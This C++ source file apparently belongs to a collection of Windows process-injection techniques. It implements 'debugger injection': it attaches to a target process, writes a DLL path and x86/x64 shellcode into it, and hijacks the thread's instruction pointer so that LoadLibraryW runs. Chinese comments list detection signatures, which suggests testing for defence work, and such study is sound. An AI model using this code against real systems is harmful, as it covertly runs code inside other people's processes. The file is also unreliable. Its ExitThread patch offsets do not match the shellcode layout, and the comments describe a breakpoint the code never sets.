// ════════════════════════════════════════════════════════════════
//  方法 13: 调试器注入 (Debugger Injection)
//
//  原理：
//    1. 以 DEBUG_ONLY_THIS_PROCESS 附加到目标进程
//    2. 等待 CREATE_PROCESS_DEBUG_EVENT
//    3. 在目标进程写入 shellcode（LoadLibrary + CC 断点）
//    4. 修改 IP 指向 shellcode
//    5. ContinueDebugEvent 恢复执行
//    6. 收到 EXCEPTION_DEBUG_EVENT (CC 断点) 时恢复原始流程
//
//  检测特征：
//    - Debug API:  DebugActiveProcess 附加
//    - Sysmon Event 10: 调试器权限请求
//    - 进程状态: 处于被调试状态 (IsDebuggerPresent)
//    - 安全产品: 反调试检测会发现
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <iostream>

bool Inject_Debugger(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 调试器注入 → PID=%lu\n", pid);

    // 1. 附加为目标进程的调试器
    if (!DebugActiveProcess(pid))
    {
        Print(L"  [!] DebugActiveProcess 失败: %lu\n", GetLastError());
        return false;
    }
    Print(L"  [+] 已附加为调试器\n");

    // 关闭调试器在进程退出时自动退出
    DebugSetProcessKillOnExit(FALSE);

    // 2. 写入 DLL 路径到目标进程
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
        PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError());
        DebugActiveProcessStop(pid);
        return false;
    }

    LPVOID remotePath = WriteStringToProcess(hProc, dllPath);
    if (!remotePath)
    {
        Print(L"  [!] 写入 DLL 路径失败\n");
        CloseHandle(hProc);
        DebugActiveProcessStop(pid);
        return false;
    }

    LPVOID pLoadLib = GetLoadLibraryAddr();
    Print(L"  [+] DLL 路径 @ %p, LoadLibraryW @ %p\n", remotePath, pLoadLib);

    // 3. 等待调试事件
    DEBUG_EVENT dbgEvent{};
    bool injected = false;
    int eventCount = 0;

    while (WaitForDebugEvent(&dbgEvent, 5000) && eventCount < 100)
    {
        eventCount++;

        if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT)
        {
            Print(L"  [+] 收到 CREATE_PROCESS_DEBUG_EVENT\n");

            // 获取主线程句柄
            HANDLE hThread = dbgEvent.u.CreateProcessInfo.hThread;

            // 获取线程上下文
            CONTEXT ctx{};
            ctx.ContextFlags = CONTEXT_FULL;
            GetThreadContext(hThread, &ctx);

            // 构造 shellcode: LoadLibraryW(dllPath) + ExitThread(0)
            // 简化：直接在目标进程分配 shellcode
            size_t dllPathBytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);

#ifdef _WIN64
            // x64 shellcode: sub rsp,28; mov rcx,remotePath; mov rax,LoadLibraryW; call rax; xor ecx,ecx; push rcx; mov rax,ExitThread; call rax
            uint8_t code[] = {
                0x48, 0x83, 0xEC, 0x28,                                   // sub rsp, 0x28
                0x48, 0xB9, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,     // mov rcx, remotePath
                0x48, 0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,     // mov rax, LoadLibraryW
                0xFF, 0xD0,                                               // call rax
                0x33, 0xC9,                                               // xor ecx, ecx
                0x51,                                                     // push rcx
                0x48, 0xB8, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,     // mov rax, ExitThread
                0xFF, 0xD0,                                               // call rax
            };
            memcpy(code + 6, &remotePath, 8);
            memcpy(code + 16, &pLoadLib, 8);
            LPVOID pExit = GetExitThreadAddr();
            memcpy(code + 30, &pExit, 8);
#else
            // x86 shellcode
            uint8_t code[] = {
                0x68, 0x00,0x00,0x00,0x00,     // push remotePath
                0xB8, 0x00,0x00,0x00,0x00,     // mov eax, LoadLibraryW
                0xFF, 0xD0,                     // call eax
                0x6A, 0x00,                     // push 0
                0xB8, 0x00,0x00,0x00,0x00,     // mov eax, ExitThread
                0xFF, 0xD0,                     // call eax
            };
            memcpy(code + 1, &remotePath, 4);
            memcpy(code + 6, &pLoadLib, 4);
            LPVOID pExit = GetExitThreadAddr();
            memcpy(code + 13, &pExit, 4);
#endif

            LPVOID remoteCode = VirtualAllocEx(hProc, nullptr, sizeof(code),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(hProc, remoteCode, code, sizeof(code), nullptr);

#ifdef _WIN64
            ctx.Rip = (DWORD64)remoteCode;
#else
            ctx.Eip = (DWORD)remoteCode;
#endif
            SetThreadContext(hThread, &ctx);
            Print(L"  [+] IP 已修改为 %p\n", remoteCode);
            injected = true;
        }

        ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);

        if (injected) break;
    }

    // 4. 分离调试器
    DebugActiveProcessStop(pid);
    CloseHandle(hProc);

    if (injected)
    {
        Print(L"  [✓] 调试器注入完成\n");
        return true;
    }
    else
    {
        Print(L"  [!] 未收到 CREATE_PROCESS_DEBUG_EVENT\n");
        return false;
    }
}
